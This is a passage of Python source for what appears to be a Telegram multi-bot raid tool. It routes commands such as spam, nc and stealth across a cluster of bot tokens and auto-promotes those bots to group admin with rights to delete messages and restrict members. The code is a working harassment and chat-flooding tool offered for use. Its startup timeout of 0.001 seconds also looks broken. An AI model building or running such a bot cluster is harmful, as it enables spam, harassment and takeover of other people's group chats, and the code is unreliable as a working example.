        await update.message.reply_text(f"✅ Legion Velocity Tuned Successfully: {speed}s")
    except:
        watermark = (
            "╭▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰━╮\n"
            "┃ 𓆩🚬𓆪  ꉂ🗯.꩜‹—𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 『𑣲⊹°˖𝐓⃝𑄜ꪀ𝐲~𝐒𝐌𝟎𝐊𝐄𝐒ᝰ🚬ৡ࿔࣪𝆹𝅥ᦡ』𓆩🚬𓆪\n"
            "╰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰╯"
        )
        await update.message.reply_text(f"❌ Invalid speed syntax, My King.\n\n{watermark}", parse_mode="Markdown")

@auth_required
async def stats_cmd(update, context):
    await update.message.reply_text(f"📊 Active Operations: {len(db.get_active())}\n🤖 Online Shadow Soldiers: {len(controller.bots)}")

# ==================== DYNAMIC ROUTER & AUTO-PROMOTER ====================
async def dynamic_command_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.effective_message.text if update.effective_message else None
    if not text: return

    is_custom = text.startswith(controller.prefix)
    is_default = text.startswith("/")
    
    if not (is_custom or is_default):
        return
        
    used_prefix = controller.prefix if is_custom else "/"
    parts = text.split()
    cmd_part = parts[0][len(used_prefix):].lower().split('@')[0]
    context.args = parts[1:]
    
    commands_map = {
        "start": start_cmd, "arisemyarmy": arisemyarmy_cmd, "changearmy": changearmy_cmd,
        "menu1": menu1_cmd, "menu2": menu2_cmd, "menu3": menu3_cmd,
        "menu4": menu4_cmd, "menu5": menu5_cmd,
        "arise": arise_cmd, "fall": fall_cmd, "nc": nc_cmd, "spam": spam_cmd, "stop": stop_cmd,
        "stopall": stopall_cmd, "speed": speed_cmd, "stats": stats_cmd,
        "pre": pre_cmd, "summon": summon_cmd, "setvid": setvid_cmd, "rmvid": rmvid_cmd,
        "stealth": stealth_cmd, "clear": clear_cmd, "info": info_cmd,
        "addsudo": addsudo_cmd, "delsudo": delsudo_cmd
    }
    
    if cmd_part in commands_map:
        await commands_map[cmd_part](update, context)

async def auto_promote_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.new_chat_members: return
    
    chat_id = update.effective_chat.id
    for member in update.message.new_chat_members:
        if any(member.id == bot_info['id'] for bot_info in controller.bots):
            try:
                await context.bot.promote_chat_member(
                    chat_id=chat_id,
                    user_id=member.id,
                    can_manage_chat=True,
                    can_change_info=True,
                    can_delete_messages=True,
                    can_invite_users=True,
                    can_restrict_members=True,
                    can_pin_messages=True,
                    can_promote_members=False
                )
                logger.info(f"✅ Auto-Promoted cluster bot {member.id} in {chat_id}")
            except Exception as e:
                logger.error(f"Failed to auto-promote {member.id}: {e}")

async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "close":
        await query.message.delete()
    elif query.data == "stats":
        await query.message.reply_text(f"📊 Active Ops: {len(db.get_active())} | 🤖 Shadow Soldiers: {len(controller.bots)}")
    elif query.data == "summon_menu":
        await summon_cmd(update, context)
    elif query.data == "main_menu":
        await start_cmd(update, context)

# ==================== MAIN INIT ====================
async def main():
    print("=" * 10)
    print("ANT KING BERU'S FINAL REFINED BOOTING...")
    print("=" * 10)
    
    valid_tokens = [t.strip() for t in TOKENS if t.strip() and len(t) > 10]
    for idx, token in enumerate(valid_tokens):
        try:
            app = Application.builder().token(token).build()
            bot_info = await asyncio.wait_for(app.bot.get_me(), timeout=0.001)
            
            app.add_handler(MessageHandler(filters.TEXT, dynamic_command_router))
            app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, auto_promote_bots))
            app.add_handler(CallbackQueryHandler(button_callback_handler))
            
            await app.initialize()
            await app.start()
            if app.updater: await app.updater.start_polling()
            
            controller.bots.append({'id': bot_info.id, 'username': bot_info.username, 'bot': app.bot, 'app': app})
            print(f"✅ Shadow Soldier #{idx+1} Online: @{bot_info.username}")
        except Exception as e:
            print(f"❌ Shadow Soldier #{idx+1} Failed: {str(e)[:30]}")
    
    print("=" * 10)
    print(f"🚀 Ready: {len(controller.bots)}/10 Shadow Soldiers Active under King Deva | Velocity: {controller.speed}s")
    print("=" * 10)
    
    while True: await asyncio.sleep(5)

def signal_handler(sig, frame):
    print("\n🛑 Marshal Beru returning shadow army to the abyss...")
    controller.stop_all()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

if __name__ == "__main__":
    keep_alive()
    try: asyncio.run(main())
    except KeyboardInterrupt: controller.stop_all()
    except Exception as e: traceback.print_exc()
